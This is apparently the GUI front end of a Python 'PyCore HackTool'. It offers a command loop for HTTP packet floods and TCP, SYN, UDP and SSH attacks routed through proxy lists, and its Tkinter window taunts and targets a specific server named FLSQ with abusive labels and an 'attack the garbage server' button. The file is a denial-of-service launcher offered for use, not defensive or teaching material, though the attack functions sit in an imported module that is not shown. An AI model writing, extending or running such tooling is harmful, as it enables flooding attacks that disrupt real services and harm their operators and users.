import _thread
import os
import sys
import tkinter as tk

from PyCoreHackToolUtils import *

## 此处参考无GUI的注释
def main():
   try:
       if not os.path.exists(SELF_CONF_PATH):
           f = open(SELF_CONF_PATH, 'x')
           initConfig(CONFIG)
           f.close()
   except:
       os.remove(SELF_CONF_PATH)
       f = open(SELF_CONF_PATH, 'x')
       initConfig(CONFIG)
       f.close()

   else:
       _thread.start_new_thread(resetToNewConfig, (CONFIG,))
   while True:
       cmd = str(input("PyCore@HackTool -> ")).split(" ")
       try:
           if cmd[0] == "atk":

               sendPacketAttack(toRequestUrl([cmd[1]]), int(str(cmd[2])), failnum=int(cmd[3]))
           elif cmd[0] == "exit":
               sys.exit("Exited.")

           elif cmd[0] == "ps":
               if cmd[1] == "clear":
                   try:
                       os.remove('./proxies.txt')
                   except:
                       pass

               elif cmd[1] == "get":
                   print(getProxies())
               elif cmd[1] == "to":
                   print(proxiesTo(cmd[2], cmd[3]))
           elif cmd[0] == "tcpatk":
               tcpAttack((cmd[1], int(cmd[2])), int(cmd[3]))
           elif cmd[0] == "fullatk":
               tcpAttack((cmd[1], int(cmd[2])), int(cmd[3]))
           elif cmd[0] == "synatk":

               synAttack(cmd[1], int(cmd[2]), cmd[3], int(cmd[4]), int(cmd[5]))
           elif cmd[0] == "bsynatk":

               synAttackBetter(cmd[1], cmd[2], int(cmd[3]))
           elif cmd[0] == "udpatk":

               udpAttack(cmd[1].lower().replace("http://", '').replace("https://", ''), int(cmd[2]), int(cmd[3]))
           elif cmd[0] == "sshatk":
               sshAttack(cmd[1], int(cmd[2]), int(cmd[3]))
           elif cmd[0] == "set":
               if cmd[1] == "reset":
                   initConfig(CONFIG)
           else:
               if cmd != '\n':
                   colormsg("Error command.", 'yellow')

       except (IndexError, ValueError, TypeError) as e:
           if e == "list index out of range":
               print("参数不完整。")
           else:
               print(f"Error:{e}")
               pass

# 创建窗口
def create_window():
   window = tk.Tk()
   window.title("PyCore SBFLSQ")  # 标题
   window.geometry("400x300")     # 分辨率
   window.configure(bg="white")   # 背景颜色

   # 首信息
   label = tk.Label(window, text="FUCKFLSQ", font=("Arial", 24), bg="white")
   label.pack(pady=20)

   # 副消息
   submit_button = tk.Label(window,text="傻鸟FLSQ，建议重开", font=("微软雅黑", 16), bg="white")
   submit_button.pack(pady=20)

   entry = tk.Entry(window, font=("Arial", 16))
   entry.pack(pady=10)

   def on_submit():
       cmd = entry.get()
       entry.delete(0, tk.END)
       if cmd:
           print(cmd)
           main()
   
   # 启动按钮
   submit_button = tk.Button(window, text="攻击FLSQ垃圾服务器", font=("微软雅黑", 10), command=on_submit)
   submit_button.pack(pady=10)

   window.mainloop()

if __name__ == "__main__":
   create_window()
